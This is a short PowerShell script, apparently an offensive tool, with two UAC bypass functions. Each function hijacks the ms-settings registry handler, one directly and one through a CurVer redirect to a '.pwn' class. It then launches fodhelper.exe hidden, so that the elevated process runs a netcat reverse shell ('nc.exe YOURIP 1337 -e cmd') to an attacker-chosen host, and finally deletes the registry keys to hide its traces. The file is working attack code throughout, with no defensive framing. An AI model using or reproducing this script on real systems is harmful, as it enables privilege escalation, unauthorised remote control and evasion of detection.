<#
.NOTES
    Author: 0xshdax
#>

function UACBypass1 {
    $REG_KEY = "HKCU\Software\Classes\ms-settings\Shell\Open\command"
    $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"

    Set-ItemProperty -Path $REG_KEY -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path $REG_KEY -Name "" -Value $CMD -Force

    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    Start-Sleep -Seconds 5

    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}

function UACBypass2 {
    $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"

    New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $CMD -Force

    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force

    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    Start-Sleep -Seconds 5

    Remove-Item -Path "HKCU:\Software\Classes\.pwn\" -Recurse -Force
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
